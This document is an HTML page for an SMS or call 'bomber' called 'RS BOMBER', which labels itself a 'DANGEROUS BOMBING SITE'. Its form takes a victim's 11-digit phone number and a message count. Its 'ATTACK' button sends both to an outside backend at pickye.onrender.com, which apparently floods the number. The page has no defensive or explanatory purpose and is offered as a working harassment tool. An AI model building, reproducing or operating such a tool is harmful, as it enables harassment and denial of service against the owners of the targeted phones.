<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="DANGEROUS BOMBING SITE">
    <meta name="author" content="RS RISHAD SABUJ">
    <title>RS BOMBER</title>
    <style>
        :root {
            --background-color: rgb(4, 4, 4);
            --box-background: rgb(7, 7, 7);
            --shadow-color: rgb(89, 89, 89);
            --heading-color: cyan;
            --text-color: cyan;
            --font-size: 20px;
            --border-color: cyan;
            --button-hover: cyan;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: var(--background-color);
        }

        h1 {
            color: var(--heading-color);
            display: block;
            text-align: center;
            margin: 25px 25px 0 25px;
            padding: 25px 25px 0 25px;
            font-size: 60px;
        }

        .main {
            height: 500px;
            width: 900px;
            background-color: var(--box-background);
            display: block;
            margin: 0 auto;
            margin-top: 6%;
            box-shadow: 0 4px 15px 0 var(--shadow-color);
            border-radius: 10px;
            color: var(--text-color);
        }

        .main input {
            height: 45px;
            width: 70%;
            display: block;
            margin: 0 auto;
            outline: none;
            text-decoration: none;
            font-size: var(--font-size);
            font-weight: bold;
            border-top: none;
            border-left: none;
            border-right: none;
            border-color: var(--border-color);
            margin-top: 15px;
            color: cyan;
            background: transparent;
        }

        .main label {
            position: relative;
            left: 15%;
            top: 57px;
            font-size: 25px;
            color: var(--text-color);
            pointer-events: none;
            transition: 0.5s;
        }

        .main .submit {
            height: 50px;
            width: 250px;
            display: block;
            margin: 0 auto;
            margin-top: 20px;
        }

        .main .submit div {
            position: relative;
            display: inline-block;
            padding: 15px 50px;
            color: #03e9f4;
            font-size: 20px;
            text-decoration: none;
            text-transform: uppercase;
            overflow: hidden;
            transition: .5s;
            margin-top: 40px;
            letter-spacing: 4px;
            cursor: pointer;
        }

        .container footer span {
            color: var(--text-color);
            display: block;
            margin-top: 50px;
        }

        .container footer span a {
            color: var(--text-color);
            text-decoration: none;
            font-weight: bold;
        }

        .main .submit div:hover {
            background: #03e9f4;
            color: #fff;
            border-radius: 5px;
            box-shadow: 0 0 5px var(--button-hover),
                        0 0 5px var(--button-hover),
                        0 0 10px var(--button-hover),
                        0 0 40px var(--button-hover);
        }
    </style>
</head>
<body> 
    <div class="container">
        <div class="main">
            <h1 class="text">RS BOMBER</h1>
            <label class="number_text">Number</label>
            <input type="number" maxlength="11" minlength="11" id="phone">
            <label class="amount_text">Amount</label>
            <input type="number" id="amount">
            <div class="submit">
                <center>
                <div id="submit" onclick="sendRequest()">
                    ATTACK 
                </div>
                </center>
            </div>
        </div>
        <footer>
            <center>
            <span>Contact Site Owner ðŸ‘‰ <a href="https://www.facebook.com/AlpHaRisHaD.33">CLICK</a></span>
            </center>
        </footer>
    </div>

    <script>
        function sendRequest() {
            const phone = document.getElementById('phone').value;
            const amount = document.getElementById('amount').value;

            if (phone.length === 11) {
                const url = `https://pickye.onrender.com?number=${phone}&amount=${amount}`;
                fetch(url)
                    .then(response => response.json())
                    .then(data => {
                        alert('Request sent successfully!');
                        console.log(data);
                    })
                    .catch(error => {
                        alert('Error sending request: ' + error);
                    });
            } else {
                alert('Please enter a valid 11-digit phone number.');
            }
        }
    </script>
</body>
</html>
